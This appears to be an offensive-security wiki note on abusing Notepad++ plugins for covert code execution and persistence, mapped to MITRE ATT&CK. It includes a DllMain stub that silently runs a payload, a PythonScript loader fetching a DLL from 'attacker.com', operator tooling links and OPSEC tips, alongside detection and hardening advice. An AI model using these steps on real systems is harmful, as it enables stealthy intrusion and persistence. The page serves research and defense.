---
title: Notepad++ Plugin Abuse
permalink: /wiki/concepts/notepadplusplus-abuse/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
redirect_from:
- /wiki/concepts/notepadplusplus-abuse/
---

**Category:** Defense Evasion / Persistence / Execution
**MITRE ATT&CK:** T1574.002 — DLL Side-Loading; T1059.006 — Python; T1036 — Masquerading
**Related:** [Offensive Python](/wiki/concepts/offensive-python/), [Dll Hijacking](/wiki/concepts/dll-hijacking/), [Evasion Techniques](/wiki/concepts/evasion-techniques/)

## Overview
Notepad++ plugins are Windows DLLs loaded automatically at startup. Planting a malicious plugin DLL or weaponizing the legitimate PythonScript plugin gives arbitrary code execution inside the Notepad++ process — a well-known, commonly installed, signed application. Network connections from `notepad++.exe` blend with legitimate developer activity, making detection difficult.

## Plugin Architecture
Plugins live in: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll`
- Standard install: `C:\Program Files\Notepad++` — non-admin users cannot write here
- Portable install: user-writable directory — no admin required

Notepad++ calls these exports on startup:

| Export | When called | Purpose |
|--------|------------|---------|
| `setInfo(NppData)` | DLL load | Exchange info, initialize plugin menu |
| `getName()` | Initialization | Plugin name for plugins list |
| `getFuncsArray(int*)` | After setInfo | Defines menu items |
| `beNotified(SCNotification*)` | On events (file open, etc.) | React to user activity |
| `messageProc(UINT, WPARAM, LPARAM)` | Other messages | Additional comms channel |
| `DllMain` | DLL load | **Executes payload here on load** |

## Attack Paths

### Path 1: Drop a Custom Plugin DLL
Build a minimal C DLL, compile, place in `Plugins\<YourName>\<YourName>.dll`, restart Notepad++:
```c
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Execute payload
        WinExec("cmd.exe /c payload.exe", SW_HIDE);
    }
    return TRUE;
}
```
Non-admin vectors:
1. **Portable Notepad++:** Download portable version to user-writable location; plugins folder is writable
2. **Copy install:** Copy `C:\Program Files\Notepad++` to user-writable location; launch that copy

Cons: DLL is unsigned; may be flagged. No native way to force `-noPlugin` via GPO.

### Path 2: Reflective DLL Loader Plugin
Use TrustedSec's [LoadDLL plugin](https://gitlab.com/KevinJClark/ops-scripts/-/tree/main/notepad_plus_plus_plugin_LoadDLL):
- Exposes a dialog to load a DLL from disk or URL
- Reflectively maps the DLL into memory — no disk write for the payload
- Quality-of-life features for operators

### Path 3: PythonScript Plugin (Preferred — Uses Signed DLLs)
PythonScript ships a Python interpreter as a signed DLL, lending legitimacy.

**Default version is Python 2.7.** Upgrade to Python 3:
```
# Download PythonScript 3 alpha from GitHub releases (bruderstein/PythonScript)
# Clear existing PythonScript folder
# Copy all files from PythonScript_Full_3.0.24.0.zip into plugins\PythonScript\
# The python3.x.dll is signed by Python Software Foundation
```

**Reflective DLL loading from PythonScript:**
```python
# Drop this into plugins\PythonScript\scripts\loader.py
# Use hardcoded-path version (PythonScript can't accept command-line args)
# Reference: https://gitlab.com/-/snippets/4786803

import ctypes, urllib.request

url = "http://attacker.com/payload.dll"
dll_bytes = urllib.request.urlopen(url).read()

# Reflectively load DLL from memory bytes
# (see full snippet for complete ctypes implementation)
```

**Installing packages without pip (offline):**
PythonScript has no pip. Use the offline package workflow:
```python
# On attacker machine with pip:
python offline_package_downloader.py --requirements requirements.txt
# Creates packages.zip

# Transfer to target, then inside Notepad++ PythonScript console:
exec(open('embedded_python_package_installer.py').read())
# Installs from packages.zip into PythonScript's Python environment
```
Scripts: [offline_package_downloader.py](https://gitlab.com/KevinJClark/ops-scripts/-/tree/main/python_package_management)

### Backdooring Infrastructure Supply Chain
The Notepad++ updater infrastructure was breached in a real-world incident (reference in source), demonstrating the supply chain risk. A backdoored update = arbitrary code execution in all existing Notepad++ installations.

## OPSEC Notes
- `notepad++.exe` is signed by Notepad++ authors
- PythonScript's Python DLL is signed by Python Software Foundation
- Python creates unbacked RWX memory sections by default — unusual but hard to baseline
- Network connections from `notepad++.exe` to unknown hosts = strong IOC
- Notepad++ connecting to PyPI repos could indicate package installation (if internet access)

## Detection & Hardening
- **Application control:** Restrict `notepad++.exe` to `C:\Program Files\Notepad++` only — prevents portable installs
- **Plugin monitoring:** Unexpected DLLs in Plugins directory, especially unsigned ones
- **Network monitoring:** `notepad++.exe` → outbound connections to unusual destinations
- **`-noPlugin` flag** disables plugins but does not prevent an attacker from running Notepad++ without it
- Simplest fix: remove Notepad++ if not required; treat like Python.exe or PowerShell as a high-risk interpreter

## References
- TrustedSec — "Notepad++ Plugins: Plug and Payload" (2026-02-19)
- Notepad++ breach incident notice (notepad-plus-plus.org/news/hijacked-incident-info-update)
- PythonScript releases — github.com/bruderstein/PythonScript
- Messenger proxy tool — github.com/skylerknecht/messenger
